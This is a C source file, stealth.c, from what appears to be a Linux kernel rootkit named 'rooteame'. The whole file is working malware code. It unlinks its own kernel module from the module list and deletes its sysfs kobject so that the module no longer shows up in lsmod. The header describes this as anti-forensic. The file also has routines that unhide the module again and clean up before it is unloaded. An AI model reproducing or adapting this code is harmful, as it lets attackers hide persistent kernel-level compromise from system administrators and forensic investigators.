/* rooteame - stealth.c
 * Self-hiding: remove module from kernel module list (hides from lsmod)
 * Additional anti-forensic measures
 * ruby570bocadito © 2026
 */
#include "core.h"

static struct list_head *saved_module_list = NULL;

int stealth_hide_module(void) {
    if (module_hidden)
        return 0;

    /* Store the previous module entry before removing ourselves */
    saved_module_list = THIS_MODULE->list.prev;

    /* Remove ourselves from the kernel module list */
    list_del(&THIS_MODULE->list);

    /* Clear the list pointers to prevent tracing back */
    THIS_MODULE->list.next = LIST_POISON1;
    THIS_MODULE->list.prev = LIST_POISON2;

    /* Remove reference in sysfs */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    module_hidden = 1;
    pr_info(ROOTEAME_TAG " module hidden from lsmod/sysfs\n");
    return 0;
}

int stealth_unhide_module(void) {
    if (!module_hidden)
        return 0;

    /* Re-insert into module list */
    list_add(&THIS_MODULE->list, saved_module_list);

    /* Re-add to sysfs */
    if (kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
                     "rooteame")) {
        pr_warn(ROOTEAME_TAG " failed to re-add kobject\n");
    }

    module_hidden = 0;
    pr_info(ROOTEAME_TAG " module visible again\n");
    return 0;
}

int stealth_init(void) {
    pr_info(ROOTEAME_TAG " stealth module initialized\n");
    return 0;
}

void stealth_cleanup(void) {
    if (module_hidden) {
        /* Must re-add before rmmod or kernel will panic */
        list_add(&THIS_MODULE->list, saved_module_list);
        if (kobject_add(&THIS_MODULE->mkobj.kobj,
                         THIS_MODULE->mkobj.kobj.parent, "rooteame")) {
            /* Continue anyway */
        }
        module_hidden = 0;
    }
    pr_info(ROOTEAME_TAG " stealth cleaned\n");
}
